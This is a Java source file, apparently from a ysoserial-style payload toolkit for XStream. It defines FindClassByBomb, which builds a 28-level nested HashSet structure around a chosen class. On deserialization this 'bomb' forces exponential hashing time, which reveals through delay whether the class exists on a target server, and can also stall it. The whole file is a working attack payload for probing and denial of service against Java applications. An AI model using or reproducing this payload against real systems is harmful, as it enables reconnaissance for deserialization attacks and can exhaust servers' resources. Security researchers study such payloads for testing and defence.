package cn.butler.xstream.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.payloads.util.ClassUtil;
import cn.butler.payloads.PayloadRunner;
import cn.butler.payloads.annotation.Authors;

import java.util.HashSet;
import java.util.Set;

@SuppressWarnings ( {
    "restriction"
} )
@Authors({ Authors.B0T1ER })
public class FindClassByBomb implements ObjectPayload<Object> {

    @Override
    public Object getObject(final String command) throws Exception {
        int depth;
        String className = null;

        if (command.contains("|")) {
            String[] x = command.split("\\|");
            className = x[0];
            depth = Integer.valueOf(x[1]);
        } else {
            className = command;
            depth = 28;
        }

        Class<?> findClazz = ClassUtil.genClass(className);
        Set<Object> root = new HashSet<Object>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<Object>();
        for (int i = 0; i < depth; i++) {
            Set<Object> t1 = new HashSet<Object>();
            Set<Object> t2 = new HashSet<Object>();
            t1.add(findClazz);

            s1.add(t1);
            s1.add(t2);

            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return root;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(FindClassByBomb.class, args);
    }
}
